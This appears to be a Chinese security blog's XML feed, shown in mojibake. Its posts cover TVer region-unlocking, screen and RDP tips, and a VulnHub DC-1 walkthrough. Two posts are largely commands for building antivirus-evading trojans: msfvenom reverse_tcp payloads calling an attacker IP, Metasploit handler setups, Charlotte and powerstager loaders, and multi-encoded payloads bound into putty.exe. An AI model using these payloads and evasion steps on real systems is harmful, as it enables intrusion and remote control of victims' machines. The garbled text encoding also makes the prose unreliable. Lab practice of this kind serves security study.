<p>ä¼—æ‰€å‘¨çŸ¥å­—å¹•ç»„åˆ¶ä½œå­—å¹•éœ€è¦ä¸€äº›æ—¶é—´ï¼Œè€Œä¸”å‘å¸ƒå¾€å¾€é€šè¿‡ç™¾åº¦ç½‘ç›˜è¿™ç§é«˜(åƒ)çº§(åœ¾)çš„æ–¹å¼æˆ–è€…btä¸‹è½½çš„æ–¹å¼è¿›è¡Œä¸‹è½½ï¼Œè€Œä¸”è¿˜å­˜åœ¨ä¸€äº›ç‰ˆæƒä¸Šçš„é—®é¢˜ï¼Œè™½ç„¶å­—å¹•ç»„éƒ½æ˜¯ç”¨çˆ±å‘ç”µï¼Œä½†æ˜¯èƒ½ä½¿ç”¨æ­£ç‰ˆçš„æ–¹å¼è§‚çœ‹è¿˜èƒ½æ›´å¿«çš„çœ‹åˆ°æ–°å‰§å‘å¸ƒï¼Œä½•ä¹è€Œä¸ä¸ºå‘¢ï¼Œä¹‹å‰ä¸€ç›´éƒ½æ˜¯ç›´æ¥ç”¨youtubedlæ¥ç»•è¿‡tverçš„é”åŒºï¼Œä½†æ˜¯è¦ä¸‹è½½å°±å¾ˆéº»çƒ¦ï¼Œè™½ç„¶å¯ä»¥ä¸¢åœ¨embyè®©æœåŠ¡å™¨ä¸‹è½½ä½†æ€»ä¸é‚£ä¹ˆä¼˜é›…ï¼Œä½¿ç”¨ä¸“ç”¨çš„æœºåœºç»“ç‚¹æ¥è§£é”tveräº§ç”Ÿçš„å¾ˆå¤šè§†é¢‘æµé‡ã€‚</p>
<p>æ‰€ä»¥æœ‰æ²¡æœ‰ä¸€ç§æ›´ç»æµä¸ä¼˜é›…çš„æ–¹å¼æ¥è§£é”é”åŒºçš„tverï¼Œçš„ç¡®æœ‰ï¼Œæœ¬è´¨è¿˜æ˜¯é€šè¿‡ä»£ç†æµé‡æ¥ç»•è¿‡é”åŒºçš„é™åˆ¶ï¼Œä½†è§†é¢‘æµé‡ä¸èµ°ä»£ç†ï¼ˆtverå›½å†…æ²¡å¢™ï¼‰ã€‚</p>
<span id="more"></span>

<h2 id="tverè§£é”"><a href="#tverè§£é”" class="headerlink" title="tverè§£é”"></a>tverè§£é”</h2><p>éœ€è¦çš„å·¥å…·æ˜¯ä¸€é¢—è„‘å­ï¼Œä¸€ä¸ªå¯ä»¥å®‰è£…SwitchyOmegaæ’ä»¶çš„æµè§ˆå™¨ï¼ˆchrome,firefoxå‡å¯ï¼‰ï¼Œä¸€ä¸ªæ—¥æœ¬ipçš„ç»“ç‚¹ï¼ˆæˆ‘ç”¨v2rayæ¼”ç¤ºï¼‰</p>
<p>å‡†å¤‡å®Œæ¯•å¼€å§‹è§£é”ï¼Œé¦–å…ˆè®¾ç½®æˆ‘ä»¬çš„æ—¥æœ¬ä»£ç†å¹¶ä¸”é€‰æ‹©è¿æ¥ï¼Œæ³¨æ„ä¸€ä¸‹èµ°çš„åè®®å’Œå¯¹åº”çš„ç«¯å£æˆ‘è¿™é‡Œé€‰çš„æ˜¯socks5åè®®å’Œ10000ç«¯å£ï¼ˆè¿™éƒ¨ä¸æ¸…æ¥šå¯ä»¥å»ç½‘ä¸Šæ‰¾ä¸‹å¯¹åº”ä»£ç†çš„è§£é”æ•™ç¨‹ï¼‰</p>
<p>ç„¶åé‡ç‚¹ä¾¿æ˜¯æˆ‘ä»¬æµè§ˆå™¨ä¸­çš„æ’ä»¶ï¼Œè¿™ä¸ªæ’ä»¶ä¼šæ ¹æ®æˆ‘ä»¬çš„é…ç½®æ¥è‡ªåŠ¨ä»£ç†æµé‡åšåˆ°åˆ†æµçš„æ•ˆæœ</p>
<p><strong>æˆ‘ä»¬çš„ç›®çš„å°±æ˜¯è®©tveréªŒè¯åœ°åŒºçš„æµé‡èµ°æ—¥æœ¬ä»£ç†ï¼Œå…¶ä»–æµé‡èµ°æœ¬åœ°ç›´è¿å³å¯</strong></p>
<ol>
<li>æ–°å»ºä¸€ä¸ªprofileè¿™è¾¹æˆ‘å‘½åä¸ºjapan,ç„¶åå¡«å…¥æˆ‘ä»¬çš„ä»£ç†è¿æ¥ä¿¡æ¯ï¼Œå¯¹åº”çš„å°±æ˜¯æˆ‘æœ¬åœ°v2rayå®¢æˆ·ç«¯å¯åŠ¨çš„ç«¯å£å’Œåè®®</li>
</ol>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1644048155895-2022-2-516:02:36.png"></p>
<ol start="2">
<li><p>ç‚¹å‡»auto switché€‰é¡¹å¡</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1644048316036-2022-2-516:05:16.png"></p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1644048337947-2022-2-516:05:38.png"></p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1644048364931-2022-2-516:06:05.png"></p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1644048404858-2022-2-516:06:45.png"></p>
<blockquote>
<p>å…¶å®ä¸»è¦æ˜¯é€šè¿‡brightcoveè¿›è¡Œé”åŒºçš„ï¼Œæœ‰å…´è¶£çš„å¯ä»¥æœç´¢ä¸€ä¸‹è¿™ä¸ªæœåŠ¡å•†ï¼Œå…¶ä»–çš„åŸŸåé€šé…ï¼ˆæ¯”å¦‚crisp.chat,googleapiï¼‰å¯èƒ½ä¸èµ°ä»£ç†ä¹Ÿå¯ä»¥</p>
</blockquote>
<p>æ·»åŠ å‡ ä¸ªæƒ…å†µè®©tverçš„è§£é”é™åˆ¶urlèµ°æˆ‘ä»¬çš„ä»£ç†ï¼Œç„¶åè®©æˆ‘ä»¬çš„tver.jpèµ°ç›´è¿</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1644048564047-2022-2-516:09:24.png"></p>
</li>
<li><p>ç„¶åå°†ä»£ç†åˆ‡æ¢æˆauto switchï¼Œæ‰“å¼€tveræ­£å¸¸è§‚çœ‹å³å¯</p>
</li>
</ol>
<h2 id="å®é™…æ•ˆæœ"><a href="#å®é™…æ•ˆæœ" class="headerlink" title="å®é™…æ•ˆæœ"></a>å®é™…æ•ˆæœ</h2><p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1644048799246-2022-2-516:13:19.png"></p>
<p>å¯ä»¥çœ‹åˆ°æ˜æ˜¾çš„æ²¡æœ‰äº§ç”Ÿè§†é¢‘æµé‡ï¼Œè€Œæˆ‘å‡ ä¹çœ‹äº†åŠä¸ªä¸‹åˆçš„å‰§</p>
<h2 id="è¿½å‰§ç½‘ç«™æ¨è"><a href="#è¿½å‰§ç½‘ç«™æ¨è" class="headerlink" title="è¿½å‰§ç½‘ç«™æ¨è"></a>è¿½å‰§ç½‘ç«™æ¨è</h2><p>å…¶ä»–è¿˜æœ‰ä¸€äº›å¯ä»¥è¿½å‰§çš„å¹³å°ï¼Œæˆ‘ä¸€ç›´è§‰å¾—tverçš„æ›´æ–°æ—¶é—´è¡¨æ€ªæ€ªçš„ï¼Œè¿™ä¸ªå°±åšçš„æŒºå¥½ï¼Œæ˜¯ä¸€ä¸ªèšåˆï¼Œå›½å†…å¯ä»¥ç›´è¿</p>
<p><a href="https://www.fami-geki.com/vod/drama-matome/">https://www.fami-geki.com/vod/drama-matome/</a></p>
<p>æ©ï¼Œæ°´å®Œäº†ï¼Œç™½å«–å¿«ä¹ã€‚</p>
<blockquote>
<p>è¿˜æœ‰ä¸€ç‚¹éœ€è¦æ³¨æ„çš„æ˜¯æœ‰çš„å‰§å¯èƒ½åœ¨firefoxä¸Šæ— æ³•æ’­æ”¾ï¼Œä½†chromeå¯ä»¥ï¼Œæ‰€ä»¥å¯ä»¥åˆ‡æ¢ä¸‹æµè§ˆå™¨è¯•è¯•</p>
</blockquote>
]]></content>
      <tags>
        <tag>æ‚</tag>
      </tags>
  </entry>
  <entry>
    <title>shellcode Loaderå…æ€</title>
    <url>/2021/11/22/shellcode-Loader%E5%85%8D%E6%9D%80/</url>
    <content><![CDATA[<p>æµ‹è¯•äº†ä¸€ä¸‹å‡ æ¬¾æ‰¾åˆ°çš„å…æ€å·¥å…·</p>
<span id="more"></span>

<h2 id="shellcode-Loaderå…æ€-windows"><a href="#shellcode-Loaderå…æ€-windows" class="headerlink" title="shellcode Loaderå…æ€(windows)"></a><a href="https://github.com/knownsec/shellcodeloader/blob/master/readme_cn.md">shellcode Loaderå…æ€</a>(windows)</h2><p>é€šè¿‡shellcode loaderæ¥åŠ è½½binæ–‡ä»¶ï¼Œè¾¾åˆ°å…æ€çš„æ•ˆæœ</p>
<h3 id="ä½¿ç”¨msfvenomç”Ÿæˆbin"><a href="#ä½¿ç”¨msfvenomç”Ÿæˆbin" class="headerlink" title="ä½¿ç”¨msfvenomç”Ÿæˆbin"></a>ä½¿ç”¨msfvenomç”Ÿæˆbin</h3><p>LHOSTå’ŒLPORTæ˜¯æ”»å‡»æœºçš„ipå’Œç«¯å£</p>
<p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.100.103 LPORT=4444 -f raw &gt; shellcode.bin</code></p>
<h3 id="ç›®æ ‡æœº"><a href="#ç›®æ ‡æœº" class="headerlink" title="ç›®æ ‡æœº"></a>ç›®æ ‡æœº</h3><p>ç„¶åå°±æ˜¯è¿›å…¥ä»–çš„å®‰è£…åŒ…é‡Œé¢ï¼Œå°†ç”Ÿæˆbinç›´æ¥æ‹–å…¥æ–‡æœ¬æ¡†ï¼Œç‚¹å‡»ç”Ÿæˆ</p>
<p>ä¼šåœ¨æ¡Œé¢ç”Ÿæˆä¸€ä¸ªloader.exeç‚¹å‡»è¿è¡Œå³å¯</p>
<h3 id="æ”»å‡»æœº"><a href="#æ”»å‡»æœº" class="headerlink" title="æ”»å‡»æœº"></a>æ”»å‡»æœº</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler        # åŠ è½½æ¨¡å—</span><br><span class="line">msf exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp        # è®¾ç½®payload</span><br><span class="line">msf exploit(multi/handler) &gt; set LHOST IP    # è®¾ç½®æ¥æ”¶shellçš„ip</span><br><span class="line">msf exploit(multi/handler) &gt; set LPORT ç«¯å£       # è®¾ç½®ç”Ÿæˆæœ¨é©¬æ—¶è®¾ç½®çš„ç«¯å£</span><br><span class="line">msf exploit(multi/handler) &gt; run       # ç›‘å¬</span><br></pre></td></tr></table></figure>

<p>æµ‹äº†ä¸€åœˆï¼Œ<code>CreateThreadPoolWaitã€€Load</code>ã€€çš„æ•ˆæœæœ€å¥½</p>
<p>ä¹Ÿæ˜¯ç«ç»’å…æ€</p>
<h2 id="Charlotte-windowså…æ€"><a href="#Charlotte-windowså…æ€" class="headerlink" title="Charlotte(windowså…æ€)"></a><a href="https://github.com/9emin1/charlotte">Charlotte(windowså…æ€)</a></h2><blockquote>
<p>2021.11.22ã€€ç«ç»’å…æ€</p>
</blockquote>
<p>ä½¿ç”¨æ­¥éª¤</p>
<ol>
<li>git clone <a href="https://github.com/9emin1/charlotte.git">https://github.com/9emin1/charlotte.git</a> &amp;&amp; apt-get install mingw-w64*</li>
<li>cd charlotte</li>
<li>msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=$YOUR_IP LPORT=$YOUR_PORT -f raw &gt; beacon.bin</li>
<li>python charlotte.py</li>
</ol>
<h3 id="ä½¿ç”¨msfvenomç”Ÿæˆbin-1"><a href="#ä½¿ç”¨msfvenomç”Ÿæˆbin-1" class="headerlink" title="ä½¿ç”¨msfvenomç”Ÿæˆbin"></a>ä½¿ç”¨msfvenomç”Ÿæˆbin</h3><p>æŒ‰ç…§ä»–çš„ç”¨æ³•ï¼Œè£…å®Œä»–çš„ç¯å¢ƒä¹‹åç¬¬ä¸€æ­¥è¿˜æ˜¯msfvenomsç”Ÿæˆä¸€ä¸ªbin</p>
<p>å¯¹äºæˆ‘çš„æ”»å‡»æœºå°±æ˜¯<code>msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.100.103 LPORT=4444 -f raw &gt; beacon.bin</code></p>
<p>æ‰“å°å‡ºæ¥çš„æœ€åä¸€å¥å°±æ˜¯éœ€è¦æ‰§è¡Œçš„å‘½ä»¤</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637554799578-2021-11-2212:19:59.png"></p>
<h3 id="æ”»å‡»æœºç›‘å¬ç«¯å£"><a href="#æ”»å‡»æœºç›‘å¬ç«¯å£" class="headerlink" title="æ”»å‡»æœºç›‘å¬ç«¯å£"></a>æ”»å‡»æœºç›‘å¬ç«¯å£</h3><p><strong>set payloadé‚£æ­¥éœ€è¦å’Œä¹‹å‰msfvenomç”Ÿæˆçš„payloadä¸€è‡´ï¼Œä¸ç„¶ç›‘å¬ä¸åˆ°</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler        # åŠ è½½æ¨¡å—</span><br><span class="line">msf exploit(multi/handler) &gt; set payload windows/x64/meterpreter_reverse_tcp        # è®¾ç½®payload</span><br><span class="line">msf exploit(multi/handler) &gt; set LHOST IP    # è®¾ç½®æ¥æ”¶shellçš„ip</span><br><span class="line">msf exploit(multi/handler) &gt; set LPORT ç«¯å£       # è®¾ç½®ç”Ÿæˆæœ¨é©¬æ—¶è®¾ç½®çš„ç«¯å£</span><br><span class="line">msf exploit(multi/handler) &gt; run       # ç›‘å¬</span><br></pre></td></tr></table></figure>



<h3 id="ç›®æ ‡æœº-1"><a href="#ç›®æ ‡æœº-1" class="headerlink" title="ç›®æ ‡æœº"></a>ç›®æ ‡æœº</h3><p>ç›®æ ‡æœºè¿è¡Œdll</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637553901011-2021-11-2212:05:01.png"></p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637554094038-2021-11-2212:08:14.png"></p>
<p>æˆåŠŸæ‹¿åˆ°shell</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637555076392-2021-11-2212:24:36.png"></p>
<h2 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h2><p>æ‹¿åˆ°shellä¹‹åéœ€è¦å¹²ä»€ä¹ˆï¼Ÿ</p>
<p><a href="https://xz.aliyun.com/t/2536#toc-9">https://xz.aliyun.com/t/2536#toc-9</a></p>
]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>å…æ€</tag>
      </tags>
  </entry>
  <entry>
    <title>screenä½¿ç”¨</title>
    <url>/2021/11/18/screen%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<p>screençš„ç”¨æ³•</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">åˆ›å»ºä¸€ä¸ªåŒ¿åçš„screenä¼šè¯</span></span><br><span class="line">screen</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">åˆ›å»ºä¸€ä¸ªæ–°çš„screenä¼šè¯(æœ‰åå­—)</span></span><br><span class="line">screen -S session_name</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">æŸ¥çœ‹æ‰€æœ‰çš„screenä¼šè¯,è¿™ä¸ªå‘½ä»¤ä¼šè¿”å›session_id</span></span><br><span class="line">screen -ls</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">æ€æ­»ä¸€ä¸ªå·²ç»detachçš„ä¼šè¯</span></span><br><span class="line">screen -X -S session_name/session_id quit</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> æ¢å¤å·²ç»detachçš„ä¼šè¯</span></span><br><span class="line">screen -r session_name/session_id</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> detachä¸€ä¸ªä¼šè¯ã€€ï¼šã€€å¿«æ·é”®ï¼ŒæŒ‰Ctrl+A+Dé”®</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>æŠ€å·§</category>
      </categories>
      <tags>
        <tag>å·¥å…·</tag>
      </tags>
  </entry>
  <entry>
    <title>linuxä½¿ç”¨rdpè¿œç¨‹è¿æ¥windows</title>
    <url>/2021/12/18/linux%E4%BD%BF%E7%94%A8rdp%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5windows/</url>
    <content><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>ä¹‹å‰ç”¨è¿‡<code>ubuntu</code>è‡ªå¸¦çš„ä¸€ä¸ªè¿œç¨‹è½¯ä»¶ï¼Œè¿˜æ˜¯å›¾å½¢åŒ–çš„ï¼Œä¹Ÿæ”¯æŒrdpåè®®ã€€å«<code>remmina</code>ï¼Œé‚£ä½“éªŒçœŸçš„æ‹‰èƒ¯ï¼Œåªèƒ½æ˜¾ç¤ºä¸€1/4å±å¹•â€¦</p>
<span id="more"></span>

<h2 id="windowså®¶åº­ç‰ˆå¼€å¯è¿œç¨‹æ¡Œé¢"><a href="#windowså®¶åº­ç‰ˆå¼€å¯è¿œç¨‹æ¡Œé¢" class="headerlink" title="windowså®¶åº­ç‰ˆå¼€å¯è¿œç¨‹æ¡Œé¢"></a>windowså®¶åº­ç‰ˆå¼€å¯è¿œç¨‹æ¡Œé¢</h2><p>ä¼—æ‰€å‘¨çŸ¥ï¼Œwindowså®¶åº­ç‰ˆå¹¶ä¸å¥½ç”¨ï¼Œç‰¹åˆ«æ˜¯å½“æ¶‰åŠåˆ°ä¸€äº›é«˜çº§çš„ç³»ç»Ÿé…ç½®çš„æ—¶å€™æ¯”å¦‚ç»„ç­–ç•¥æ²¡æœ‰è¿˜è¦è‡ªå·±å¼€ï¼Œè€Œè¿™ä¸ªè¿œç¨‹æ¡Œé¢ä¹Ÿä¸€æ ·ï¼Œæˆ‘å»å¹´åœ¨åˆ«çš„æœºå­ä¸ŠæŠ˜è…¾è¿‡ä¸€éï¼Œæ˜¯çœŸçš„æŠ˜è…¾</p>
<p>ä¹‹å‰æ²¡ï¼Œç°åœ¨è®°å½•ä¸€ä¸‹</p>
<p>ç”¨çš„æ˜¯è¿™ä¸ªé¡¹ç›®</p>
<p><a href="https://github.com/stascorp/rdpwrap">https://github.com/stascorp/rdpwrap</a></p>
<p>ä¸‹è½½æ— è„‘è§£å‹ï¼Œç‚¹å‡»å®‰è£…è„šæœ¬ï¼Œè£…å®Œä¹‹åï¼Œå› ä¸ºç³»ç»Ÿç‰ˆæœ¬éƒ½å¾ˆé«˜å¤§æ¦‚ç‡æ˜¯ä¸è¡Œçš„ï¼Œæ˜¾ç¤ºçš„æ˜¯æœªæ”¯æŒ</p>
<p>è¿™ä¸ªæ—¶å€™éœ€è¦æ›¿æ¢æ–‡ä»¶ä¸¤ä¸ªä¸ºä½ è‡ªå·±çš„windowsç‰ˆæœ¬ï¼Œä¸ºè¿™ä¸ªå·¥å…·åšé€‚é…</p>
<p><code>winver</code>æŸ¥çœ‹windowsçš„ç‰ˆæœ¬ï¼Œç„¶åå»ç½‘ä¸Šæœå¯¹åº”çš„æ–‡ä»¶ä¸€èˆ¬æ˜¯ã€€termsrv.dllï¼ˆè¿™æ¬¡æ²¡æ›¿æ¢è¿™ä¸ªå°±èƒ½ç”¨äº†ï¼Œæ›¿æ¢è¿™ä¸ªæœ‰ç³»ç»Ÿå´©æºƒé£é™©ï¼‰å’Œrdpwrap.iniï¼Œrdpwrap.dllæ–‡ä»¶</p>
<h3 id="æ›¿æ¢æ–‡ä»¶"><a href="#æ›¿æ¢æ–‡ä»¶" class="headerlink" title="æ›¿æ¢æ–‡ä»¶"></a>æ›¿æ¢æ–‡ä»¶</h3><p>å®‰è£…å®Œä¹‹åä¼šéœ€è¦ä¿®æ”¹ä¸¤ä¸ªæ–‡ä»¶ï¼Œåœ¨<code>C:\Program Files\RDP Wrapper</code>è¿™ä¸ªè·¯å¾„ä¸‹ï¼Œç„¶åæ ¹æ®è‡ªå·±çš„ç³»ç»Ÿç‰ˆæœ¬æ¥æ›¿æ¢</p>
<p><a href="https://github.com/stascorp/rdpwrap/issues/1630">https://github.com/stascorp/rdpwrap/issues/1630</a></p>
<p><a href="https://github.com/affinityv/INI-RDPWRAP">https://github.com/affinityv/INI-RDPWRAP</a></p>
<p>æ€»ç»“ä¸€ä¸‹å…¶å®å°±åªè¦installè„šæœ¬å®‰è£…ä¹‹åç›´æ¥æ›¿æ¢å¯¹åº”ç³»ç»Ÿç‰ˆæœ¬çš„rdpwrap.iniå’Œdllæ–‡ä»¶å°±è¡Œï¼Œå¦‚æœè¿˜ä¸è¡Œå°±è¯•è¯•æ›¿æ¢termscrv.dll</p>
<p>æœ€ç»ˆç›®çš„å°±æ˜¯è¾¾åˆ°é‚£ä¸ªå…¨ç»¿</p>
<h3 id="è¿˜ä¸è¡Œï¼Ÿ"><a href="#è¿˜ä¸è¡Œï¼Ÿ" class="headerlink" title="è¿˜ä¸è¡Œï¼Ÿ"></a>è¿˜ä¸è¡Œï¼Ÿ</h3><p>å¦‚æœå…¨ç»¿äº†è¿˜ä¸è¡Œï¼Œè€ƒè™‘ä»¥ä¸‹å‡ ä¸ªé—®é¢˜</p>
<ol>
<li><p>windowsé˜²ç«å¢™æ˜¯å¦æ”¾è¡Œäº†3389</p>
</li>
<li><p>windowsæ˜¯å¦æœ‰æœ¬åœ°ç”¨æˆ·</p>
</li>
</ol>
<h2 id="rdesktop"><a href="#rdesktop" class="headerlink" title="rdesktop"></a>rdesktop</h2><p>è¿™æ¬¡å› ä¸ºè¿œç¨‹å·¥ä½œéœ€æ±‚ï¼Œåˆéœ€è¦ç”¨åˆ°è‡ªå¸¦çš„rdpï¼Œæ‰¾äº†æ‰¾å·¥å…·ï¼Œå‘ç°äº†è¿™ä¸ª<code>rdesktop</code></p>
<p>å‘½ä»¤è¡Œå·¥å…·ï¼Œè¿˜æŒºå¥½ç”¨</p>
<p><code>rdesktop -a 16 -u [username] -p [password]ã€€[your_remotehost]</code></p>
<ul>
<li>è¿™ä¸ªå‚æ•°å¯ä»¥å…±äº«å‰ªåˆ‡æ¿</li>
</ul>
<p><code>-r clipboard:PRIMARYCLIPBOARD</code></p>
<ul>
<li>è¿™ä¸ªå‚æ•°å¯ä»¥å…±äº«æ–‡ä»¶ç›®å½•ç»™è¿œç¨‹ä¸»æœº</li>
</ul>
<p><code> -r disk:test=/tmp</code></p>
]]></content>
      <tags>
        <tag>æ‚</tag>
      </tags>
  </entry>
  <entry>
    <title>msfæœ¨é©¬</title>
    <url>/2021/11/19/msf%E6%9C%A8%E9%A9%AC/</url>
    <content><![CDATA[<p>å°è¯•ä¸€ä¸‹ä¼ æœ¨é©¬åˆ°ç›®æ ‡æœºç„¶åç”¨msfç›‘å¬</p>
<h3 id="powerstger"><a href="#powerstger" class="headerlink" title="powerstger"></a>powerstger</h3><p><code>python powerstager.py -m -t win64 --lhost=192.168.100.103 --lport=4444 -o /tmp/payload.exe</code></p>
<p>ç›´æ¥ä½¿ç”¨è¿™ä¸ªç”Ÿæˆä¸€ä¸ªæœ¨é©¬ç„¶åä½¿ç”¨msfconsoleç›‘å¬</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set lhost 192.168.100.103</span><br><span class="line">set lport 4444</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>è®¾ç½®äº†ä¸€ä¸‹å¿…è¦çš„å‚æ•°,</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637300782157-2021-11-1913:46:22.png"></p>
<p>æŠŠåˆšåˆšä¸å“¦é‚£ä¸ªpayloadç”Ÿæˆçš„ä¸¢è™šæ‹Ÿæœºæ‰§è¡Œ,ç„¶åæ‹¿åˆ°shell</p>
<p><img src="/home/harry/.config/Typora/typora-user-images/image-20211119135213459.png" alt="image-20211119135213459"></p>
<p>ç„¶è€Œæ²¡æœ‰ç»•è¿‡ç«ç»’ï¼Œç›´æ¥è¢«æ‹¦æˆªäº†ï¼Œå…³äº†ç«ç»’å†æ‰“å¾—:small_airplane:</p>
<p>è¿˜è¯•äº†ä¸€ä¸‹<a href="https://github.com/Veil-Framework/Veil">https://github.com/Veil-Framework/Veil</a></p>
<p>è¿™ä¸ªä¹Ÿæ˜¯ç›´æ¥å°±è¢«æ‹¦æˆªäº†</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637302026758-2021-11-1914:07:06.png"></p>
<h3 id="msfè‡ªå¸¦"><a href="#msfè‡ªå¸¦" class="headerlink" title="msfè‡ªå¸¦"></a>msfè‡ªå¸¦</h3><p><a href="https://mp.weixin.qq.com/s/A0CZslLhCLOK_HgkHGcpEA">https://mp.weixin.qq.com/s/A0CZslLhCLOK_HgkHGcpEA</a></p>
<p>19å¹´çš„å…æ€æµ‹è¯•ï¼Œè¿™é‡Œè®°å½•ä¸‹å‘½ä»¤</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#å¯ä»¥æŸ¥çœ‹æ‰€æœ‰çš„ç¼–ç å™¨</span><br><span class="line">msfvenom --list encoders</span><br></pre></td></tr></table></figure>



<ul>
<li>åŸå§‹å…æ€</li>
</ul>
<p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -f exe -o payload1.exe</code></p>
<ul>
<li>msfè‡ªç¼–ç </li>
</ul>
<p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -e x86/shikata_ga_nai -b &quot;\x00&quot; -i 15  -f exe -o payload2.exe</code></p>
<ul>
<li>msfè‡ªæ†ç»‘å…æ€</li>
</ul>
<p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333  -x putty.exe  -f exe -o payload3.exe</code></p>
<ul>
<li>msfè‡ªæ†ç»‘+å…æ€</li>
</ul>
<p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -e x86/shikata_ga_nai -x putty.exe  -i 15 -f exe -o payload4.exe</code></p>
<ul>
<li>msfè‡ªæ†ç»‘å¤šæ¬¡ç¼–ç å…æ€</li>
</ul>
<p><code>msfvenom  -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 20 LHOST=10.211.55.2 LPORT=3333 -f raw | msfvenom -e x86/alpha_upper -i 10 -f raw | msfvenom -e x86/countdown -i 10 -x putty.exe -f exe -o payload5.exe</code></p>
<h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><p>è¿™ä¸ªå…æ€ä¸“é¢˜ç”¨æ¥å‚è€ƒæŒºå¥½</p>
<p><a href="https://github.com/TideSec/BypassAntiVirus">https://github.com/TideSec/BypassAntiVirus</a></p>
<p>æŒ–ä¸ªå‘ï¼ŒshelllcodeLoaderå…æ€<a href="https://github.com/knownsec/shellcodeloader/blob/master/readme_cn.md">https://github.com/knownsec/shellcodeloader/blob/master/readme_cn.md</a></p>
]]></content>
      <categories>
        <category>Webå®‰å…¨</category>
      </categories>
      <tags>
        <tag>å·¥å…·</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub-DC-1</title>
    <url>/2021/11/18/vulnhub-DC-1/</url>
    <content><![CDATA[<p>vulnhubçš„DC-1é¶æœº</p>
<span id="more"></span>



<h3 id="ä¸»æœºå‘ç°"><a href="#ä¸»æœºå‘ç°" class="headerlink" title="ä¸»æœºå‘ç°"></a>ä¸»æœºå‘ç°</h3><p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637215364734-2021-11-1814:02:44.png"></p>
<h3 id="æ¼æ´å‘ç°"><a href="#æ¼æ´å‘ç°" class="headerlink" title="æ¼æ´å‘ç°"></a>æ¼æ´å‘ç°</h3><p>ç”¨msfæ‰¾ä¸€æ‰¾è¿™ä¸ªæ¡†æ¶çš„æ¼æ´</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637216977266-2021-11-1814:29:37.png"></p>
<p>è¿›å…¥äº¤äº’å¼shell</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637217050571-2021-11-1814:30:50.png"></p>
<p>å¾—åˆ°ä¸€ä¸ªæç¤º</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637217193058-2021-11-1814:33:13.png"></p>
<p>æœä¸€æœè¿™ä¸ªcmsçš„é…ç½®æ–‡ä»¶</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637217496023-2021-11-1814:38:16.png"></p>
<p>è®¿é—®è¿™ä¸ªé…ç½®æ–‡ä»¶</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637217659243-2021-11-1814:40:59.png"></p>
<p>ç”±msfåˆ›å»ºå‡ºæ¥çš„æ˜¯ä¸èƒ½ç›´æ¥è¿›è¡Œäº¤äº’çš„ï¼Œåªæ˜¯ä¸€ä¸ªshell</p>
<p><strong>åˆ›ä¸€ä¸ªäº¤äº’å¼å‘½ä»¤è¡Œ</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;`</span><br></pre></td></tr></table></figure>
